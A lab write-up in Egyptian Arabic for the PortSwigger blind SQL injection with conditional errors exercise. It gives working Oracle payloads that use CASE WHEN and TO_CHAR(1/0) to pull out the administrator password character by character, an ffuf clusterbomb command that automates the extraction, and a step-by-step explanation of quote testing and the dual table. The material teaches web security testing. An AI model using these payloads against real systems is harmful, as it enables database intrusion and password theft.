# Lab: Blind SQL injection with conditional errors

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

- الفكره من الLab ده انك تعرف ترجع dataمن غير رساله error واضحه او output او data ظاهره
- كله من رساله error الي مش واضحه بس
- احنا شغالين oracle

```bash
1. '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||'  ==> بيه هل الثغره موجوده ولا لا testده الكود الي ه

2. '||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='2') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)||' ==> غلط code 200 يبقي صح  code 500 الي نستخرج بيه كلمه السر عنطريق   payloadده ال

3. ffuf -request req.txt -request-proto https -mode clusterbomb -w Basic_Num_20.txt:FUZZONE -w Simple_PaYload.txt:FUZZTWO -mc 500 -v ==> ده اسرع بكتير وانجو

4. sed -i '/Status:/d;/URL/d' results.txt  ==> وحجات تانيه فا ده هيشيلها status الناتج هيطلع فيه حجات ملهاش لازمه ذي 
```

# 1️⃣ أول خطوة

```
TrackingId=xyz'
```

## 🔥 اللي حصل:

- ضفت `'` واحدة
- الكويري بقى فيه **string مفتوحة**

👉 زي:

```
...WHERE TrackingId='xyz''
```

❌ Syntax Error → السيرفر يديك error

# 2️⃣ بعد كده

```
TrackingId=xyz''
```

## 🔥 اللي حصل:

- بقي عندك `'` و `'` → string اتقفلت صح

👉 زي:

```
...WHERE TrackingId='xyz'''
```

✔️ مفيش error

## 🧠 الاستنتاج

> ✔️ السيرفر حساس للـ quotes
> 
> 
> ✔️ في error based behavior
> 

# 3️⃣ الخطوة المهمة بقى

```
TrackingId=xyz'||(SELECT '')||'
```

## 🤔 إنت عملت إيه؟

- قفلت string `'`
- استخدمت:

```
||
```

👉 ده operator في Oracle لدمج strings

- عملت subquery:

```
SELECT''
```

## ❌ ليه عمل error؟

في Oracle:

> ❗ مينفعش تعمل SELECT من غير table
> 

# 4️⃣ الحل

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

## 🔥 إيه `dual` دي؟

دي table special في Oracle

👉 بتستخدمها لما عايز تعمل:

```
SELECT حاجة من غير جدول
```

## 🧠 اللي حصل هنا

- الكويري بقى valid
- مفيش error

# 🎯 الاستنتاج الكبير

> 💥 السيرفر بيستخدم Oracle
>
